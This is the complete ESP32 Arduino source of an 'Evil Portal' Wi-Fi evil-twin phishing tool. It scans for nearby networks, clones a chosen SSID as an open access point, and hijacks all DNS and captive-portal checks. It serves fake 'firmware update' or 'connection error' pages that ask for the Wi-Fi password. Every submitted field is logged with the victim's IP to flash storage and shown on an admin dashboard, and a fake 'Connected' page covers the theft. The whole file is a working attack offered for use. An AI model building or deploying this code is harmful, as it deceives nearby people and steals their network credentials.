#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <esp_wifi.h>

// --- CONFIGURATION ---
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  String bssidStr;
} NetworkInfo;

struct EvilTwinConfig {
  String title = "Firmware Update Required";
  String subtitle = "SYSTEM MAINTENANCE MODE";
  String body = "Your device requires a critical firmware update.<br><br>Please enter your WiFi password.";
  String selectedCustomPage = "";
  bool useCustomHTML = false;
};

// --- GLOBALS ---
const byte DNS_PORT = 53;
const char* CRED_FILE = "/creds.txt"; 

IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
EvilTwinConfig evilTwinConfig;

String currentEvilTwinSSID = "";
unsigned long lastScan = 0;
const unsigned long SCAN_INTERVAL = 15000;
bool hotspotActive = false;

// --- ADMIN UI HTML ---
const char HEADER_TEMPLATE[] PROGMEM = R"raw(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>%TITLE%</title>
  <style>
    :root { --primary: #FF4B2B; --primary-grad: linear-gradient(to right, #FF416C, #FF4B2B); --bg: #F0F2F5; --card-bg: #FFFFFF; --text: #333; }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background: var(--bg); color: var(--text); padding-bottom: 30px; }
    .container { max-width: 800px; margin: 0 auto; padding: 15px; }
    .header { background: var(--primary-grad); color: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(255, 75, 43, 0.3); margin-bottom: 20px; text-align: center; }
    .card { background: var(--card-bg); border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
    h1 { font-size: 1.5rem; margin-bottom: 5px; }
    h2 { font-size: 1.2rem; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
    .btn { display: inline-block; width: 100%; padding: 12px; border: none; border-radius: 8px; background: var(--primary-grad); color: white; font-weight: bold; cursor: pointer; text-decoration: none; margin-bottom: 10px; text-align: center;}
    .btn.secondary { background: #6c757d; } .btn.danger { background: #dc3545; } .btn.success { background: #28a745; }
    input[type="text"], textarea, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 10px; }
    .table-container { overflow-x: auto; } table { width: 100%; border-collapse: collapse; } th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
    .status-badge { padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; background: #eee; color: black; font-weight: bold; } 
    .active-badge { background: #d4edda; color: #155724; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: bold; }
    .live-dot { height: 10px; width: 10px; background-color: #f00; border-radius: 50%; display: inline-block; animation: blink 1s infinite; margin-right: 5px; }
    @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
    .cred-box { background: #fff3cd; border-left: 5px solid #ffc107; padding: 15px; margin-bottom: 10px; word-wrap: break-word; }
    @media (min-width: 600px) { .btn-group { display: flex; gap: 10px; } .btn { margin-bottom: 0; } }
  </style>
</head>
<body><div class="container">
)raw";
const char FOOTER[] PROGMEM = "</div></body></html>";

// --- UTILS ---
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str; for (uint32_t i = 0; i < size; i++) { if (b[i] < 0x10) str += "0"; str += String(b[i], HEX); if (i < size - 1) str += ":"; } return str;
}
String getCurrentTime() {
  unsigned long t = millis() / 1000; char buf[20]; sprintf(buf, "%02lu:%02lu:%02lu", (t / 3600) % 24, (t / 60) % 60, t % 60); return String(buf);
}

// --- LOGGING ---
void logCredentialsToSPIFFS(String ssid, String capturedData, String ip) {
  File f = SPIFFS.open(CRED_FILE, "a");
  if (f) {
    f.println(getCurrentTime() + " | SSID: " + ssid + " | " + capturedData + " | IP: " + ip);
    f.close();
    Serial.println("✅ Credential SAVED to SPIFFS.");
  } else {
    Serial.println("❌ ERROR: Could not write to SPIFFS.");
  }
}
String readCredentialsFromSPIFFS() {
  if (!SPIFFS.exists(CRED_FILE)) return "<p>No credentials captured yet.</p>";
  File f = SPIFFS.open(CRED_FILE, "r"); String content = "";
  while (f.available()) { String line = f.readStringUntil('\n'); if (line.length() > 0) content = "<div class='cred-box'><strong>" + line + "</strong></div>" + content; }
  f.close(); return content;
}
void clearCredentials() { SPIFFS.remove(CRED_FILE); }

// --- FILE SYSTEM ---
String loadHTMLContent(const String& filename) {
  String filepath = filename.startsWith("/") ? filename : "/" + filename;
  if (SPIFFS.exists(filepath)) { File file = SPIFFS.open(filepath, "r"); if (file) { String c = file.readString(); file.close(); return c; } }
  return "";
}
bool saveHTMLFile(const String& filename, const String& content) {
  String filepath = filename.startsWith("/") ? filename : "/" + filename; if (!filepath.endsWith(".html")) filepath += ".html";
  File file = SPIFFS.open(filepath, "w"); if (!file) return false; file.print(content); file.close(); return true;
}
std::vector<String> getHTMLFiles() {
  std::vector<String> files; File root = SPIFFS.open("/"); File file = root.openNextFile();
  while (file) { String fname = String(file.name()); if (fname.endsWith(".html") || fname.endsWith(".htm")) files.push_back(fname.startsWith("/") ? fname.substring(1) : fname); file = root.openNextFile(); }
  return files;
}

// --- EVIL TWIN CORE ---
String generateEvilTwinPage() {
  if (evilTwinConfig.useCustomHTML && !evilTwinConfig.selectedCustomPage.isEmpty()) {
    String custom = loadHTMLContent(evilTwinConfig.selectedCustomPage);
    if (!custom.isEmpty()) return custom;
  }
  
  // Hardcoded Fallback
  return R"raw(<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check</title>
  <style>body{font-family:sans-serif;background:#eee;padding:20px;text-align:center}.box{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
  input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}</style></head>
  <body><div class="box"><h2>Connection Error</h2><p>Please enter your WiFi password to verify identity.</p>
  <form action="/" method="post"><input type="password" name="password" placeholder="WiFi Password" required><button type="submit">Connect</button></form></div></body></html>)raw";
}

void performScan() {
  int n = WiFi.scanNetworks(false, true); networks.clear();
  if (n > 0) { for (int i = 0; i < n && i < 20; ++i) { NetworkInfo net; net.ssid = WiFi.SSID(i); if (net.ssid.isEmpty()) net.ssid = "[Hidden]"; memcpy(net.bssid, WiFi.BSSID(i), 6); net.ch = WiFi.channel(i); net.bssidStr = bytesToStr(net.bssid, 6); networks.push_back(net); } }
  WiFi.scanDelete();
}

void startEvilTwin() {
  if (selectedNetwork.ssid.isEmpty()) return;
  WiFi.softAPdisconnect(true); delay(500);
  // Ensure the gateway is set to itself (Critical for DNS spoofing)
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  if (WiFi.softAP(selectedNetwork.ssid.c_str(), NULL, selectedNetwork.ch)) {
    hotspotActive = true; currentEvilTwinSSID = selectedNetwork.ssid;
    // Start DNS Server to hijack ALL domains
    dnsServer.stop(); dnsServer.start(DNS_PORT, "*", apIP);
    Serial.println("\n[+] EVIL TWIN STARTED: " + selectedNetwork.ssid);
    Serial.println("Wait for victims...");
  } else { WiFi.softAP("WiFi_Pentest", "password123"); }
}

void stopEvilTwin() {
  hotspotActive = false; dnsServer.stop(); WiFi.softAPdisconnect(true); delay(500);
  WiFi.softAP("WiFi_Pentest", "password123"); dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("\n[-] EVIL TWIN STOPPED");
}

// --- CENTRAL CREDENTIAL PROCESSOR ---
void processCaptivePortalLogin() {
  String ip = webServer.client().remoteIP().toString();
  String capturedData = "";
  
  // 1. Log Arguments (Standard Form Data)
  for (int i = 0; i < webServer.args(); i++) {
    capturedData += webServer.argName(i) + ": " + webServer.arg(i) + "  ";
  }

  // 2. Fallback: If no args but Body exists (Raw Data/JSON)
  if (capturedData == "" && webServer.hasArg("plain")) {
    capturedData = "RAW BODY: " + webServer.arg("plain");
  }
  
  if (capturedData == "") capturedData = "[Unknown Data Format - Check Raw Headers]";

  Serial.println("\n🔥 CAPTURED: " + capturedData);
  logCredentialsToSPIFFS(currentEvilTwinSSID, capturedData, ip);

  // Return a Success Page that mimics "Restored Internet" to close the portal window
  String html = R"(<html><head><meta http-equiv="refresh" content="3;url=http://google.com"></head>
  <body style="text-align:center;font-family:sans-serif;padding:50px;">
  <h1 style="color:green;">Connected</h1><p>Verifying credentials...<br>Redirecting to Internet...</p>
  </body></html>)";
  webServer.send(200, "text/html", html);
}

// --- HANDLERS ---
void handleAdmin() {
  String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Admin");
  
  // Custom Title
  html += "<div class='header'><h1>Evil Portal by Sabbir SEU EEE B43</h1>";
  
  if (hotspotActive) html += "<div class='active-badge'>Live: " + currentEvilTwinSSID + "</div>"; else html += "<div class='status-badge'>Standby</div>"; html += "</div>";
  
  html += "<div class='card'><h2>Controls</h2><div class='btn-group'>";
  if (hotspotActive) html += "<form method='post' action='/control' style='flex:1'><button name='action' value='stop' class='btn danger'>STOP</button></form>";
  else html += "<form method='post' action='/control' style='flex:1'><button name='action' value='start' class='btn success'>START</button></form>";
  html += "<a href='/scan' class='btn secondary' style='flex:1'>Scan</a></div></div>";

  html += "<div class='card'><h2>Settings</h2><div class='btn-group'><a href='/config' class='btn secondary' style='flex:1'>Config Page</a><a href='/upload' class='btn secondary' style='flex:1'>Upload HTML</a></div></div>";
  
  html += "<div class='card'><h2>Captured Data</h2>" + readCredentialsFromSPIFFS() + "<br><form method='post' action='/clear-logs'><button class='btn danger'>Clear</button></form></div>";
  
  if (!networks.empty()) {
    html += "<div class='card'><h2>Networks</h2><div class='table-container'><table><tr><th>SSID</th><th>CH</th><th>Action</th></tr>";
    for (const auto& net : networks) {
      html += "<tr><td>" + net.ssid + "</td><td>" + String(net.ch) + "</td><td><form method='post' action='/select'><input type='hidden' name='bssid' value='" + net.bssidStr + "'>";
      if (selectedNetwork.bssidStr == net.bssidStr) html += "<button disabled class='btn success'>Selected</button>"; else html += "<button class='btn'>Select</button>";
      html += "</form></td></tr>";
    }
    html += "</table></div></div>";
  }
  if (hotspotActive) html += "<script>setTimeout(()=>location.reload(),5000);</script>";
  html += FPSTR(FOOTER); webServer.send(200, "text/html", html);
}

// --- MAGIC HANDLER: The "Catch-All" ---
void handleCaptivePortal() {
  if (!hotspotActive) {
    webServer.sendHeader("Location", "/admin");
    webServer.send(302, "text/plain", ""); 
    return;
  }

  String host = webServer.hostHeader();
  String myIP = WiFi.softAPIP().toString();

  // 1.THIS A LOGIN ATTEMPT
  if (webServer.method() == HTTP_POST || webServer.hasArg("password") || webServer.hasArg("user") || webServer.hasArg("email")) {
    processCaptivePortalLogin();
    return;
  }

  // 2.THIS A CAPTIVE PORTAL CHECK
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "text/html", generateEvilTwinPage());
}

void handleConfig() {
  String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Config");
  html += "<div class='card'><h2>Attack Page</h2><form method='post' action='/save-config'>";
  html += "<label>Title:</label><input type='text' name='title' value='" + evilTwinConfig.title + "'>";
  html += "<label>Subtitle:</label><input type='text' name='subtitle' value='" + evilTwinConfig.subtitle + "'>";
  html += "<label>Body:</label><textarea name='body' rows='3'>" + evilTwinConfig.body + "</textarea>";
  html += "<label>Select HTML File:</label><select name='html_file'><option value=''>Default</option>";
  for(const auto& f : getHTMLFiles()) { String sel = (evilTwinConfig.selectedCustomPage == f) ? "selected" : ""; html += "<option value='" + f + "' " + sel + ">" + f + "</option>"; }
  html += "</select><br><br><button class='btn'>Save</button></form><br><a href='/admin' class='btn secondary'>Back</a></div>";
  html += FPSTR(FOOTER); webServer.send(200, "text/html", html);
}
void handleSaveConfig() {
  if (webServer.hasArg("title")) evilTwinConfig.title = webServer.arg("title");
  if (webServer.hasArg("subtitle")) evilTwinConfig.subtitle = webServer.arg("subtitle");
  if (webServer.hasArg("body")) evilTwinConfig.body = webServer.arg("body");
  String file = webServer.arg("html_file");
  if(file.isEmpty()) { evilTwinConfig.useCustomHTML = false; evilTwinConfig.selectedCustomPage = ""; } else { evilTwinConfig.useCustomHTML = true; evilTwinConfig.selectedCustomPage = file; }
  webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", "");
}
void handleUpload() {
  String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Upload");
  html += "<div class='card'><h2>Upload HTML</h2><form method='post' action='/save-html'><input type='text' name='filename' placeholder='file.html'><textarea name='content' rows='10'></textarea><button class='btn'>Save</button></form><br><a href='/admin' class='btn secondary'>Back</a></div>";
  html += FPSTR(FOOTER); webServer.send(200, "text/html", html);
}
void handleSaveHTML() {
  if(webServer.hasArg("filename") && webServer.hasArg("content")) saveHTMLFile(webServer.arg("filename"), webServer.arg("content"));
  webServer.sendHeader("Location", "/config"); webServer.send(302, "text/plain", "");
}
void handleControl() {
  if (webServer.hasArg("action")) { if (webServer.arg("action") == "start") startEvilTwin(); else stopEvilTwin(); }
  webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", "");
}
void handleScan() { performScan(); webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", ""); }
void handleSelect() {
  String bssid = webServer.arg("bssid"); for (const auto& net : networks) { if (net.bssidStr == bssid) { selectedNetwork = net; break; } }
  webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", "");
}
void handleClearLogs() { clearCredentials(); webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", ""); }

void setup() {
  Serial.begin(115200); SPIFFS.begin(true);
  
  WiFi.mode(WIFI_AP_STA); 
  

  // Set country to China (CN) or Japan (JP) to enable channels 1-13
  wifi_country_t country = {
    .cc = "CN",
    .schan = 1,
    .nchan = 13,
    .policy = WIFI_COUNTRY_POLICY_AUTO,
  };
  esp_wifi_set_country(&country);
  // ---------------------------------------------
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0)); WiFi.softAP("WiFi_Pentest", "password123");
  dnsServer.start(DNS_PORT, "*", apIP);
  
  // ADMIN ROUTES
  webServer.on("/admin", handleAdmin);
  webServer.on("/control", handleControl);
  webServer.on("/scan", handleScan);
  webServer.on("/select", handleSelect);
  webServer.on("/config", handleConfig);
  webServer.on("/save-config", handleSaveConfig);
  webServer.on("/upload", handleUpload);
  webServer.on("/save-html", handleSaveHTML);
  webServer.on("/clear-logs", handleClearLogs);

  // CAPTIVE PORTAL ROUTES
  webServer.on("/", handleCaptivePortal);
  webServer.on("/login", handleCaptivePortal);
  webServer.on("/login.php", handleCaptivePortal);
  webServer.on("/submit", handleCaptivePortal);
  webServer.on("/post", handleCaptivePortal);
  webServer.on("/user", handleCaptivePortal);
  webServer.on("/action", handleCaptivePortal);
  webServer.on("/generate_204", handleCaptivePortal);
  webServer.on("/gen_204", handleCaptivePortal);
  webServer.on("/ncsi.txt", handleCaptivePortal);
  webServer.on("/hotspot-detect.html", handleCaptivePortal);
  
  webServer.onNotFound(handleCaptivePortal);
  
  webServer.begin();
  Serial.println("Server Started.");
  performScan();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (millis() - lastScan > SCAN_INTERVAL && !hotspotActive) { performScan(); lastScan = millis(); }
}
